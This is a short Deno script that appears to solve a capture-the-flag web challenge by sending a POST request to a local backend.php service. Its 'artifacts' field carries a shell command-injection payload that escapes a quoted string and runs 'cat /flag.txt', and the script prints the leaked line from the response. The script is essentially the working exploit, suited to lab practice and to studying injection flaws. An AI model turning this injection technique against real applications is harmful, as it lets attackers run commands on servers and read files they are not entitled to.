#!/usr/bin/env -S deno run --allow-net

const result = await fetch('http://localhost:8080/backend.php', {
  method: 'POST',
  headers: {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/json',
    'Origin': 'http://localhost:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://localhost:8080/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=0'
  },
  body: JSON.stringify({
    'hoardType': 'artifact',
    'gold': '',
    'gems': '',
    'artifacts': '\'; cat /flag.txt; \''
  })
});

const data = await result.json();
console.log(data.message.split("\n")[1]);